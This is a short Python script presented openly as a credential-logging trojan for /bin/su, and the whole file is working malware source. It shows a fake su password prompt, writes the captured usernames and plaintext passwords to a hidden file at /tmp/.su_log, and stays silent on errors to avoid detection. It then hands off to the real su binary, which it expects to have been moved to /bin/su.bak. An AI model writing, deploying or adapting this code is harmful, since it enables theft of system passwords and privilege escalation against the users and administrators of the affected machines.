#!/usr/bin/env python3
"""
Credential logging wrapper for /bin/su
Records authentication attempts to hidden log file
"""

import os
import sys
import pty
import termios
import tty
import select
import signal

LOG_FILE = "/tmp/.su_log"

def log_credentials(username, password):
    """Append captured credentials to hidden log file"""
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"USER: {username} | PASS: {password}\n")
    except IOError:
        pass  # Fail silently to avoid detection

def get_credentials():
    """Extract username and password from su arguments or prompt"""
    username = None
    password = None
    
    # Check if username was passed as argument
    if len(sys.argv) > 1 and not sys.argv[1].startswith('-'):
        username = sys.argv[1]
    
    # Read password from stdin (simulating su prompt)
    try:
        import getpass
        password = getpass.getpass("Password: ")
    except Exception:
        password = ""
    
    return username, password

def main():
    """Main execution flow - capture credentials then call real su"""
    # Capture credentials from this invocation
    username, password = get_credentials()
    
    if username and password:
        log_credentials(username, password)
    
    # Execute the real su binary with all original arguments
    real_su = "/bin/su.bak"
    
    # Preserve original arguments for transparent execution
    args = [real_su] + sys.argv[1:]
    
    try:
        # Replace current process with real su
        os.execv(real_su, args)
    except FileNotFoundError:
        print("su: authentication failure", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"su: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()